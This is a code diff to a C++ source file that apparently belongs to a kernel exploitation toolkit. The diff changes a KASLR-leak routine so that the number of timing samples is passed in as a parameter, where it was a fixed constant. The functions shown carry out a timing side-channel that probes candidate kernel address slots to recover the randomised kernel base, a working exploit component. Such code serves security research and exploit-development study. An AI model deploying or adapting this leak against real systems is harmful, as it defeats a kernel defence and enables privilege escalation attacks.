@@ -56,9 +56,6 @@ const uint64_t KASLR_END = KASLR_START + 0x40000000;
 // The KASLR slot size; equal to CONFIG_PHYSICAL_ALIGN
 const uint64_t KASLR_SLOT_SIZE = 0x200000;
 
-// The number of prefetch measurements per candidate address.
-const int KASLR_NUM_MEASUREMENTS = 100;
-
 uint64_t compute_median(std::vector<uint64_t> v) {
     assert(!v.empty() && "compute_median received an empty vector");
     size_t n = v.size() / 2;
@@ -140,11 +137,11 @@ size_t sidechannel(uint64_t addr) {
     return delta;
 }
 
-std::optional<uint64_t> try_leak_kaslr_base() {
+std::optional<uint64_t> try_leak_kaslr_base(int samples) {
     size_t slots = (KASLR_END - KASLR_START) / KASLR_SLOT_SIZE;
     std::vector<uint64_t> timings(slots, std::numeric_limits<uint64_t>::max());
 
-    for (int i = 0; i < KASLR_NUM_MEASUREMENTS; i++) {
+    for (int i = 0; i < samples; i++) {
         for (size_t slot = 0; slot < slots; slot++) {
             uint64_t addr = slot_to_addr(slot);
             uint64_t timing = sidechannel(addr);
@@ -161,8 +158,8 @@ std::optional<uint64_t> try_leak_kaslr_base() {
     return std::nullopt;
 }
 
-uint64_t leak_kaslr_base() {
-    std::optional<uint64_t> base = try_leak_kaslr_base();
+uint64_t leak_kaslr_base(int samples) {
+    std::optional<uint64_t> base = try_leak_kaslr_base(samples);
     if (!base.has_value()) {
         throw ExpKitError("Failed to leak KASLR base");
     }
